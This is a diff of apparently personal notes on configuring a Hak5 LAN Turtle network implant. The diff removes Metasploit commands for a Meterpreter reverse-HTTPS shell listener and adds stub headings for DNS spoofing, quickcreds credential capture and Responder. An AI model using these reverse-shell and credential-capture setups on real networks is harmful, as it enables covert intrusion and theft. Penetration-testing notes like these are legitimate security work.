@@ -4,9 +4,7 @@ https://forums.hak5.org/topic/36363-guide-manually-updating-the-lan-turtle/
 
 Network config: 
 
-    /etc/config/network
-    
-   route add default gw X.X.X.X
+  Config > Configure 3G Modem > Enable WAN fallback
 
 
 Module locations:
@@ -19,26 +17,6 @@ Module locations:
  
 ## Modules
 
-
-### Meterpreter reverse shell
-
-Setting up listener
- 
-    msfconsole
-
-    use exploit/multi/handler
-
-    set PAYLOAD python/meterpreter/reverse_https
-
-    set LPORT/LHOST
-    set SessionExpirationTimeout 604800
-    set ExitOnSession false
-    exploit -j
-
- Set up LAN Turtle
-
- Configure meterpreter-http with the correct IP and Port.
- 
 ### AutoSSH
   
   Modules: autossh and keymanager
@@ -68,11 +46,26 @@ Setting up listener
    
     ssh root@localhost -p 2222
   
+  ### sshfs
   
+   edit the module and change both the -o options to nonempty and restart
+   
+ 
   
+ ### dnsmasq-spoof
+ 
+  file: /etc/dnsmasq.hosts
   
+ Continue working on
+ 
+ ### quickcreds 
+ 
+  Explination:
   
+  Testing
   
+ ### Responder
+ 
   
   
   
